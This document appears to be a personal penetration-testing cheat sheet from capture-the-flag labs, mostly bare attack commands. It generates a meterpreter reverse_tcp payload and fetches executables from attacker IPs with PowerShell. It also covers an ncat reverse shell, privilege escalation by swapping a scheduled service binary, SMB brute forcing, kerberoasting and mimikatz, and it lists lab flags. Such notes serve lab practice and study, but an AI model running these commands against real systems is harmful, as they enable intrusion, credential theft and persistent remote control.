# Basic exploit (metasploit) (100 detectable)

## Generate payload

* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f exe > shell.exe
* get payload to target
* start listener before runing

## Start listener

* msfconsole -> use multi/handler
* set PAYLOAD windows/meterpreter/reverse_tcp
* set LHOST <IP> set LPORT 9001
* wait for connection

## Send Netcat 

* powershell curl http://10.8.123.245:8000/ncat.exe -o ncat.exe

## Use for rev shell

* ncat.exe 10.8.123.245 9999 -e powershell


# Web IIS expoit

* Enumerate directories with nmap
* Hydra brute force admin
* Exploit blog engine 3.3.6.0 (searchsploit -m <path>)
* Edit as PostView.ascx
* upload (read expoit for instructions)
* Listen on port
* Capture session

### Metasploit Cont Version

* msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.33.220 LPORT=9001 -f exe > shell.exe

* sudo python3 -m http.server 8000

* go to c:/Windows/Temp

* powershell -c "Invoke-WebRequest -Uri 'http://10.8.123.245:8000/photo.exe' -Outfile 'C:\Windows\Temp\Hack.exe'"

* msfconsole -> use multi/handler

* set PAYLOAD windows/meterpreter/reverse_tcp

* set LHOST <IP> set LPORT 9001

* .\Hack.exe -> gain meterpreter

* drop to shell

* powershell -c "Invoke-WebRequest -Uri 'http://10.6.33.220:8000/tools/winPEAS/winPEAS.bat' -Outfile 'C:\Windows\Temp\winPEAS.bat'"
*.\winPEAS.bat

* Check for vuln processes -> Windows Scheduler -> Program Files ( Event log says message is ran every 30 sec)

* move payload into `c:\Program Files (x86)\SystemScheduler>`

* meterpreter -> mv message.exe message.bak
* mv shell.exe message.exe
* bg
* run multi/handler
* Gain shell

# Test connection

* sudo tcpdump -i tun0 icmp (Listerner)
* ping IP || ping -n 1 IP

# Use Crackmapexec to brute force smbs

* crackmapexec smb IP -u user -p wordlist
* supporta { http, smb, mssql, ldap, ssh, winrm}

# Psexec to login to smb with creds

* /usr/share/doc/python3-impacket/examples/psexec.py TROY.thm/achilles:pass@10.10.122.236

# evil-winrm to login to smb with creds

* evil-winrm -i IP -u achilles -p pass

# Post

* winpeas
* net user <user> | for group
* dir flag.txt /s /p || C dir
* .\Rubeus.exe kerberoast /outfilw:dump.txt -> https://github.com/r3motecontrol/Ghostpack-CompiledBinaries || crack hashes with john
* mimikatz exploit

# Powershell Empire
* apt get for kali
* A.V Evation, Cred have, situation awareness, lateral movement, persistence  {DEATH star: auto }
* Star killer GUI for kali | starkiller
* power-shell --rest || localhost:1337  || user - empireadmin password - password123
* responder (poisoning, mitm)

# Find files
* download ripgrep?

# Ippsec Omni video (IOT hack)




achilles THM{a95c530a7af5f492a74499e70578d150}
Admin THM{883f9bae55aaf77b01a3e133159e849e}
Hecteor THM{a3256be7dfd50977a4aae6583babb884}
Patrocles THM{ee4a601a75bc632e2c8cd2a32946c873}

